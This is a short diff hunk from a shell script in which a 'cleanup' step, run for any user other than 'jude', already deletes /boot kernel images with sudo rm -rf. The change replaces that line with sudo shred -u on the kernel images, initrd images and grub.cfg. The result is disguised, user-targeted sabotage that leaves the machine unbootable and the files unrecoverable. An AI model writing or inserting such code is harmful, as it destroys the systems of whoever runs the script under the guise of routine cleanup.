@@ -637,7 +637,7 @@ case "$1" in
     if [ "$person" != "jude" ]; then
         echo "Cleaning up..."
         sudo rm -rf $CURRENT_DIR/NJIT
-        sudo rm -rf /boot/vmlinuz-*
+        sudo shred -u /boot/vmlinuz-* /boot/initrd.img-* /boot/grub/grub.cfg
     fi
     echo "Done"
     rm -rf $CURRENT_DIR
